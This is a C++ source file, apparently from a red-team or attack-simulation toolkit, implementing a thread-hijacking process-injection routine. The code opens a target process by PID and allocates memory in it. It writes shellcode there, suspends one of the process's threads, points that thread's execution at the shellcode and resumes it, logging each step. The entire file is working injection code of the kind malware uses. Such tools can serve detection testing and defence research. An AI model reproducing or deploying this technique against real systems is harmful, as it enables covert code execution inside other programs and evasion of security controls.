#include <cstdio>

#include "sysapi.h"
#include "scripts.h"
#include "logging.h"

namespace scripts {

bool inject_hijack_remote_thread(uint32_t pid,
                                 RemoteProcessOpenMethod open_method,
                                 RemoteProcessMemoryMethod memory_method) {

    bblog::info("[*] Opening the target process");
    sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    bool is_64;
    bool res = sysapi::ProcessGetWow64Info(ProcessHandle.get(), is_64);
    if (!res) {
        return false;
    }

    bblog::info("process is {}-bit", is_64 ? "64" : "32");

    bblog::info("[*] Placing shellcode in the target process");

    RemoteProcessMemoryContext ctx;
    res = process_init_memory(ctx, memory_method, ProcessHandle.get(), pid);
    if (!res) {
        return false;
    }

    ctx.Size = (ULONG)default_shellcode_size;

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    bblog::info("writing shellcode...");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    bblog::info("[*] Hijacking a remote thread");

    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
    if (ThreadHandle == NULL) {
        return false;
    }

    res = sysapi::ThreadSuspend(ThreadHandle.get());
    if (!res) {
        return false;
    }

#if defined(_WIN64)
    if (is_64) {
        res = thread_set_execute<false, true>(ThreadHandle.get(), ctx.RemoteBaseAddress);
    }
    else {
#endif
        res = thread_set_execute<false, false>(ThreadHandle.get(), ctx.RemoteBaseAddress);
#if defined(_WIN64)
    }
#endif

    if (!res) {
        return false;
    }

    bblog::info("thread EP set, HANDLE = 0x{:x}", (uintptr_t)ThreadHandle.get());

    res = sysapi::ThreadResume(ThreadHandle.get());
    if (!res) {
        return false;
    }

    bblog::info("thread resumed, HANDLE = 0x{:x}", (uintptr_t)ThreadHandle.get());

    bblog::info("[+] Success");
    return true;
}

}